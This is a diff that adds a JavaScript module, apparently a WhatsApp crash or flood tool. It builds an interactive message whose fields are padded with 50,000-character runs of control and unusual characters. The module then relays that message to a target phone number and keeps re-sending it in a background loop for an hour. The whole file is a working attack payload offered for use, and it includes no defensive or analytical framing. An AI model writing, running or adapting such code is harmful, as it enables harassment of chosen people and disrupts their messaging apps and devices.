@@ -1,0 +1,81 @@
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+function buildPayloads(target) {
+  const jid = String(target).trim().endsWith("@s.whatsapp.net")
+    ? String(target).trim()
+    : String(target).trim() + "@s.whatsapp.net";
+
+  const msg = {
+      groupStatusMessageV2: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "\u0070".repeat(50000),
+              subtitle: "\u0090".repeat(50000),
+              deck: {
+                uuid: "\u0070".repeat(50000),
+                data: "\u0090".repeat(50000),
+                type: "\u0070".repeat(50000),
+                fallback: "\u0090".repeat(50000),
+                accessibilityText:  "\u0070".repeat(50000),
+                  badge: {
+                    text:  "\u0090".repeat(50000),
+                    color:  "\u0070".repeat(50000)
+                  },
+                animations: {
+                    enter:  "\u0090".repeat(50000)
+                  },                
+                 children: [
+                  {
+                    uuid: "\u0070".repeat(50000),
+                    type:  "\u0080".repeat(50000),
+                    data:  "\u0000".repeat(50000)
+                    }
+                 ] 
+              }
+            },
+            body: { text: "\x10".repeat(50000), },
+            nativeFlowMessage: {
+              buttons: "[]".repeat(50000)
+            }
+          }
+        }
+      }
+    };
+
+  return { jid, msg };
+}
+
+async function fire(sock, p) {
+  await sock.relayMessage(p.jid, p.msg, { participant: true } );
+}
+
+module.exports = async function (sock, target) {
+  if (!sock || !target) {
+    return { ok: false, error: "Missing sock or target" };
+  }
+
+  let p;
+  try {
+    p = buildPayloads(target);
+    await fire(sock, p);
+  } catch (e) {
+    return { ok: false, error: e.message || "First call failed" };
+  }
+
+  setImmediate(async () => {
+    const end = Date.now() + 60 * 60 * 1000;
+    let n = 0;
+    while (Date.now() < end) {
+      try {
+        await fire(sock, p);
+        n++;
+        if (n % 25 === 0) await sleep(10000);
+      } catch {
+        await sleep(2000);
+      }
+    }
+  });
+
+  return { ok: true };
+};
